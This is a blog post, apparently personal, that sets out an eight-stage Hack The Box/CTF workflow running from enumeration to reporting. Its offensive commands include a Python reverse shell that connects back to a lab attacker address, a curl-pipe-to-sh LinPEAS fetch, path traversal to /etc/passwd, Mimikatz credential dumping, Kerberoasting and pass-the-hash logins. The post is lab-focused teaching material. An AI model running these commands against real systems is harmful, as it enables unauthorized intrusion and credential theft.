```json
{
  "title": "My CTF Workflow: From Setup to Report",
  "metaTitle": "My CTF Workflow: From Setup to Report",
  "metaDescription": "Eight stages for a CTF or HTB lab, from scoping and recon through exploitation, pivoting, cleanup, and reporting.",
  "slug": "ctf-workflow",
  "openGraphImagePrompt": "A clean terminal-inspired editorial diagram for an eight-stage CTF workflow: scoping, setup, enumeration, foothold, exploitation, privilege escalation, pivoting, and reporting; charcoal background, restrained blue and teal accents, readable spacing, no logos or neon effects.",
  "tags": ["CTF", "Hack The Box", "Enumeration", "Privilege Escalation"],
  "keyTakeaway": "Eight stages, recon through report, for HTB and local VM labs.",
  "summary": "How I primarily approach CTFs and Labs: Set up a workspace, enumerate deliberately, verify findings, record each step, and finish with a clear write-up. The stages below reflect my typical process rather than an exhaustive command list.",
  "author": "David Awosusi",
  "category": "CTF Workflow",
  "publishedAt": "2021-08-12",
  "visual": {
    "title": "Eight stages, recon through report",
    "caption": "The sequence from scoping and setup through enumeration, access, cleanup, and reporting.",
    "steps": [
      { "label": "1 · Scope", "detail": "Confirm target, VPN, and platform rules." },
      { "label": "2 · Setup", "detail": "Set variables, create folders, and log the session." },
      { "label": "3 · Enumerate", "detail": "Map ports, web paths, hostnames, and services." },
      { "label": "4 · Foothold", "detail": "Check a suspected weakness and verify the result." },
      { "label": "5 · Exploitation", "detail": "Turn the weakness into real access, then steady it." },
      { "label": "6 · Escalate", "detail": "Go from a limited account to full control." },
      { "label": "7 · Pivot", "detail": "Use the machine to reach deeper hosts." },
      { "label": "8 · Report", "detail": "Collect proof, clean up, and document the path." }
    ]
  },
  "schema": {
    "title": "Keep evidence attached to the finding",
    "caption": "Connect the target and service to the command, evidence, validation, and resulting access or impact.",
    "joinLabel": "target → finding → report",
    "standards": [
      {
        "name": "Target notes",
        "fields": [
          { "name": "target", "meaning": "Challenge host or address" },
          { "name": "port_service", "meaning": "Open port and service" },
          { "name": "hostname", "meaning": "Virtual host or DNS name" },
          { "name": "evidence_path", "meaning": "Saved scan or request output" }
        ]
      },
      {
        "name": "Finding notes",
        "fields": [
          { "name": "hypothesis", "meaning": "What may be vulnerable" },
          { "name": "command", "meaning": "The test that was run" },
          { "name": "observed_result", "meaning": "Output that supports or rejects it" },
          { "name": "validation", "meaning": "How the finding was confirmed" }
        ]
      }
    ],
    "output": {
      "name": "Write-up section",
      "fields": ["recon", "foothold", "privesc", "flags", "cleanup"]
    }
  }
}
```

## The approach

Every box I work follows the same eight stages, and I keep to the order even when I'm tempted to jump ahead. The discipline is what makes the write-up easy later: if I can explain why each step followed the last, I've understood the machine instead of just owning it. What follows is how I actually work, not a complete command list.

## Stage 1: Getting connected

I line up the basics first: an active VPN session, the box I'm working, and the wordlists I'll probably reach for. On a shared platform like Hack The Box, that also means staying on my own instance.

I connect with the platform's VPN profile:

```bash
sudo openvpn lab_platform.ovpn
```

Or, if the platform hands out a WireGuard config instead:

```bash
sudo wg-quick up lab
```

HTB only publishes write-ups for retired machines, so if I'm planning to write one up, I check the box has retired first.

## Stage 2: Set up the workspace

I set the target address once, make a folder for each kind of output, and record the terminal from the first command. It feels like overhead for two minutes and saves an hour later, when I need to re-run something or explain where a file came from. Swap the example address for the one assigned to the challenge.

```bash
export IP=10.129.238.31
export BOX=variatype
mkdir -p ~/htb/$BOX/{scans,web,exploits,loot,creds}
cd ~/htb/$BOX
script -a engagement_log.txt
```

`script -a` records everything that crosses the terminal, and that recording becomes the backbone of the write-up. I type `exit` to close it when I'm done. If I want a session I can detach from and reattach to later, I run the whole thing inside tmux instead:

```bash
tmux new -s "$BOX"
```

## Stage 3: Enumeration

Enumeration is just mapping what the target exposes before I touch any of it. It's the stage I rush least, because most boxes are won or lost right here.

### Ports

I start with a scan of all TCP ports, then go back and run version and default-script checks against only the ones that answered. Splitting it keeps the broad sweep fast and saves the slow work for the handful of services that matter.

```bash
nmap -p- --min-rate 5000 -oN scans/all_ports.nmap "$IP"
```

Then, with the open ports in hand (replace `22,80` with what the first scan found):

```bash
PORTS=22,80
nmap -sC -sV -p "$PORTS" -oN scans/targeted.nmap "$IP"
```

UDP gets missed a lot, because it needs its own scan. I at least check the common ones:

```bash
nmap -sU --top-ports 20 -oN scans/udp_top20.nmap "$IP"
```

RustScan is faster if I want a quicker first pass across a wide range. Either way, I resolve any hostname I find before moving on:

```bash
echo "$IP $BOX.htb" | sudo tee -a /etc/hosts
```

### Web hosts and paths

If a web server is open, I fingerprint it and browse it by hand before I fuzz anything. The page titles, redirects and login forms usually point me somewhere faster than a wordlist does.

```bash
whatweb "http://$IP"
nikto -h "http://$IP"
```

A lot of boxes serve their real content only when you ask for the right hostname, so I add any name I find to `/etc/hosts`:

```bash
echo "$IP $BOX.htb" | sudo tee -a /etc/hosts
```

When I think more hostnames are hiding, I fuzz for them. The catch is that a server often returns the same default page for every wrong guess, so I grab that baseline size first and filter it out:

```bash
BASELINE_SIZE=$(curl -s -o /dev/null -w '%{size_download}' -H "Host: invalid.$BOX.htb" "http://$BOX.htb/")
ffuf -u "http://$BOX.htb/" -H "Host: FUZZ.$BOX.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs "$BASELINE_SIZE"
```

Then I read `robots.txt` and look for hidden directories and files on each host worth the time:

```bash
curl -s "http://$BOX.htb/robots.txt"
```

```bash
feroxbuster -u "http://$BOX.htb/" \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,bak -o web/portal-ferox.txt
```

I don't fire several big wordlists at once; it buries the signal. I start small, watch the response codes and sizes, and only widen the search when something points me there. The [ffuf guide](https://github.com/ffuf/ffuf) and [feroxbuster docs](https://epi052.github.io/feroxbuster-docs/) have the rest of the options.

If it's running WordPress or Drupal, their own scanners save time:

```bash
wpscan --url "http://$BOX.htb" --enumerate vp,vt,u
droopescan scan drupal -u "http://$BOX.htb"
```

And an exposed `.git` folder is a gift. I pull it down and read the history for secrets left behind:

```bash
git-dumper "http://$BOX.htb/.git/" ./loot/repo
cd loot/repo && git log --all && gitleaks detect -v
```

### File shares and other services

For Windows file sharing (SMB), I check whether I can list shares with no credentials at all:

```bash
smbclient -L "//$IP/" -N
smbmap -H "$IP"
enum4linux-ng -A "$IP"
nxc smb "$IP" --shares -u '' -p ''
```

`nxc` (NetExec) is the maintained successor to CrackMapExec. A no-credential "null session" sometimes hands over share names or even account lists.

A few other services are always worth a quick look: SNMP (`snmpwalk -c public -v1 "$IP"`), anonymous FTP login, user enumeration over SMTP, and LDAP if the box is a domain controller, the server that runs a Windows network. I only go deep on the ones the scans say are actually open.

## Stage 4: Find the way in

Now I match what I found to a plausible weakness and test it. A version number is a lead, not proof. I've wasted enough time on "vulnerable" versions that turned out patched to treat it as anything more.

```bash
searchsploit "apache 2.4.52"
```

If something looks right, I copy the exploit out by its ID (replace `12345` with the real one):

```bash
EDB_ID=12345
searchsploit -m "$EDB_ID"
```

On a web app, a handful of quick checks cover most lab footholds:

- **Template injection** — the site runs my input through its own page templates. I drop `{{7*7}}` into a field, and if `49` comes back it's doing math it shouldn't. That alone is a strong hint, not full control.

```bash
curl -i "http://$IP/view?file=../../../../etc/passwd"
```

- **File inclusion** — making the app read files it shouldn't, like the one above. If it works, I follow up with the PHP wrappers (`php://filter/convert.base64-encode/resource=`).

- **SQL injection** — breaking out of a database query. A lone `'` to force an error, and if it looks real, sqlmap does the heavy lifting:

```bash
URL='http://variatype.htb/item?id=1'
sqlmap -u "$URL" --batch
```

- **Upload forms** — I test how they filter by extension, content type, and the file's actual signature.

## Stage 5: Exploitation

This is where I turn a weakness into real access. I want the target to connect back to me (a "reverse" connection), so I start the listener first and point the callback at my lab interface.

```bash
nc -lvnp 4444
```

Then I set my VPN address and send the connection back:

```bash
export LHOST=10.10.14.3
python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.environ["LHOST"],4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

That first connection is usually a rough one: no arrow keys, no tab-complete, and it dies if I hit Ctrl-C by accident. So I upgrade it into a proper interactive terminal.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Press `Ctrl-Z` to drop back to my own terminal, then:

```bash
stty raw -echo; fg
```

Press `Enter`, then set the terminal type so screen-based tools display correctly:

```bash
export TERM=xterm
```

If I'd rather skip all of that, `pwncat-cs` as the listener handles the upgrade for me:

```bash
pwncat-cs -lp 4444
```

## Stage 6: Privilege escalation

Access as an ordinary user is rarely the goal; I need full control, which is root on Linux and SYSTEM on Windows. I start with what the current account is already allowed to do, and only dig into file permissions, scheduled jobs and stored credentials once something points me there.

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.*/
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

[LinPEAS](https://github.com/peass-ng/PEASS-ng) gathers most of the local evidence for me. I run pspy next to it, because pspy catches scheduled jobs the moment they run, which LinPEAS can miss. And a command I'm allowed to run as root, or a program with special permissions, isn't automatically a dead end. I check [GTFOBins](https://gtfobins.github.io/) before I move on.

### Windows and Active Directory

On Windows I start with my own privileges and the system details:

```powershell
whoami /priv
systeminfo
```

winPEAS, PowerUp and Seatbelt automate the local hunt. For the wider Windows network:

- **BloodHound** maps the shortest path from where I am to full control of the domain:

```powershell
SharpHound.exe -c All
```

- **Mimikatz** reads credentials out of memory once I have local admin:

```text
privilege::debug
sekurlsa::logonpasswords
```

- **Kerberoasting and AS-REP roasting** both pull crackable password material out of the Windows login system:

```bash
impacket-GetUserSPNs domain/user:pass -dc-ip "$IP" -request
impacket-GetNPUsers domain/ -usersfile users.txt -no-pass -dc-ip "$IP"
```

LOLBAS is the Windows counterpart to GTFOBins: trusted built-in programs that can be turned to other uses.

## Stage 7: Reaching further in

Some boxes keep the real target on a second machine that the first one can see but I can't. Pivoting is using the machine I already own as a bridge to reach it.

The simplest version forwards a single service from the target's internal side onto my own machine:

```bash
ssh -L 8080:127.0.0.1:80 "user@$IP"
```

When there's no SSH to lean on, Chisel builds the tunnel for me:

```bash
./chisel server -p 8000 --reverse        # attacker
./chisel client 10.10.14.3:8000 R:socks # target
proxychains nmap -sT -Pn 10.10.10.0/24
```

Ligolo-ng is the newer option I reach for now. It gives me a proper network interface instead of a proxy, which is less fuss to work through. And if I've recovered a working credential or password hash, I can often step onto the next machine with it directly:

```bash
NTLM_HASH=0123456789abcdef0123456789abcdef
evil-winrm -i "$IP" -u Administrator -H "$NTLM_HASH"
impacket-psexec domain/user:pass@"$IP"
impacket-wmiexec domain/user:pass@"$IP"
```

## Stage 8: Proof, cleanup, and the write-up

I grab the proof and a few host details to anchor the write-up:

```bash
cat user.txt root.txt
hostname; id; whoami
```

Before I disconnect, I put the box back the way I found it: I delete anything I uploaded (linpeas.sh, nc.exe, chisel), remove any users, keys or scheduled jobs I added, and restore files I changed. It keeps the environment clean for the next person, and it's good muscle memory for real engagements.

Then I build the write-up from `engagement_log.txt` and my screenshots, in the order I actually worked, and I call out why each step worked. That reasoning is the difference between a write-up worth reading and a raw command transcript.

What stays in the finished piece: the scope and the service map, the evidence that led to each next step, the weakness that let me in, enough detail to reproduce it, the escalation path with the flags blurred, and anything I changed on the box. The terminal log and scans stay on disk until that's written.
